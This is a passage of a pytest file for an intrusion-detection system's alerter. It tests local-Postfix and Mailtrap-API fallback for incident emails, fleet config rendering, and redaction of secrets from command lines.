                              request), smtp=FakeSmtp(sent))
    result = alerter.send(incident("lockdown"), key=KEY)
    assert result["mail"][0] is True and posted == []
    assert sent[0]["host"] == "127.0.0.1" and sent[0]["port"] == 25
    message = sent[0]["message"]
    assert message["From"] == "ForkMesh IDS <founders@forkmesh.com>"
    assert message["Auto-Submitted"] == "auto-generated"
    assert sent[0]["from_addr"] == "no-reply@forkmesh.com"
    assert sent[0]["to_addrs"] == ["security@example.com"]
    assert '"detector": "x"' in message.get_content()
    note = json.loads([s for s in rq.statements
                       if "mail_log_node_notes" in s[0]][0][3])
    assert note["via"] == "postfix" and note["result"] == "accepted"
    assert "mt-SECRET" not in capsys.readouterr().out


def test_direct_mail_uses_the_mailtrap_api_as_root_in_a_lockdown(tmp_path):
    lock_down(tmp_path)
    sent, posted = [], []

    def opener(request, timeout=None):
        posted.append(request)
        return FakeResponse(status=200)
    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)),
                          FakeRqlite(), opener=opener, smtp=FakeSmtp(sent))
    assert alerter.mail(incident("lockdown"))[0] is True
    assert sent == []
    assert posted[0].full_url == ids.MAIL_URL
    assert posted[0].headers["Authorization"] == "Bearer mt-SECRET"
    body = json.loads(posted[0].data)
    assert body["to"] == [{"email": "security@example.com"}]
    assert body["from"]["email"] == "founders@forkmesh.com"


def test_a_lockdown_mail_the_api_refuses_waits_in_the_postfix_queue(tmp_path):
    lock_down(tmp_path)
    sent = []

    def opener(request, timeout=None):
        raise OSError("no route")
    rq = FakeRqlite()
    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)), rq,
                          opener=opener, smtp=FakeSmtp(sent))
    assert alerter.mail(incident("lockdown"))[0] is True
    assert len(sent) == 1
    note = json.loads([s for s in rq.statements
                       if "mail_log_node_notes" in s[0]][0][3])
    assert note["via"] == "postfix"
    assert note["tried"][0] == "mailtrap: OSError"


def test_direct_mail_falls_back_to_the_api_when_postfix_is_down(tmp_path):
    posted = []

    def opener(request, timeout=None):
        posted.append(request)
        return FakeResponse(status=200)
    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)),
                          FakeRqlite(), opener=opener,
                          smtp=FakeSmtp([], fail=ConnectionRefusedError()))
    ok, detail = alerter.mail(incident("test"))
    assert ok is True and detail == "mail 200" and len(posted) == 1


def test_direct_mail_without_postfix_or_token_reports_failure(tmp_path):
    mail = dict(postfix_mail(tmp_path), token_file=str(tmp_path / "none"))
    rq = FakeRqlite()
    alerter = ids.Alerter(cfg(tmp_path, mail=mail), rq,
                          opener=lambda request, timeout=None: None,
                          smtp=FakeSmtp([], fail=ConnectionRefusedError()))
    assert alerter.mail(incident("lockdown")) == (
        False, "smtp ConnectionRefusedError")
    note = json.loads([s for s in rq.statements
                       if "mail_log_node_notes" in s[0]][0][3])
    assert note["result"] == "failed"
    alerter = ids.Alerter(cfg(tmp_path, mail={"to": "",
                                              "smtp": "127.0.0.1:25"}),
                          FakeRqlite(), smtp=FakeSmtp([]))
    assert alerter.mail(incident("lockdown")) == (False, "not configured")


def test_direct_mail_never_submits_to_a_remote_smtp_host(tmp_path):
    sent = []
    mail = dict(postfix_mail(tmp_path), smtp="mail.example.com:25",
                token_file="")
    alerter = ids.Alerter(cfg(tmp_path, mail=mail), FakeRqlite(),
                          smtp=FakeSmtp(sent))
    assert alerter.mail(incident("lockdown")) == (False, "not configured")
    assert sent == []


def test_production_fleet_renders_direct_mail_without_new_secrets(tmp_path):
    import tomllib
    with open(os.path.join(REPO, "deploy", "fleet.toml"), "rb") as handle:
        production = tomllib.load(handle)["ids"]
    fleet = render.load_fleet(os.path.join(REPO, "deploy",
                                           "fleet.example.toml"),
                              state_path=tmp_path / "none.json")
    fleet["ids"] = dict(fleet["ids"], **production)
    config = json.loads(render.ids_config(fleet, "n1", "core",
                                          render.fleet_paths(fleet)))
    assert config["mail"] == {"to": "security@forkmesh.com", "from": "",
                              "smtp": "127.0.0.1:25",
                              "token_file": "/etc/postfix/sasl_passwd"}
    assert render.ids_credential_names(fleet, "core") == [
        render.IDS_KEY_CREDENTIAL, "RQLITE_PASSWORD"]
    broken = dict(fleet, ids=dict(fleet["ids"], mail_to=""))
    with pytest.raises(render.RenderError, match="ids.mail_to"):
        render.ids_settings(broken)
    broken = dict(fleet, ids=dict(fleet["ids"], mail_from="founders"))
    with pytest.raises(render.RenderError, match="ids.mail_from"):
        render.ids_settings(broken)


def test_context_redacts_secrets_in_command_lines():
    assert ids.redact(
        "git fetch https://bot:ghp_abc@github.com/x.git -c "
        "http.extraHeader=Authorization: Basic Zm9vOmJhcg== --token t0k "
        "url?token=s3&x=1 password=hunter2") == (
        "git fetch https://bot:***@github.com/x.git -c "
        "http.extraHeader=Authorization: Basic *** --token *** "
        "url?token=***&x=1 password=***")
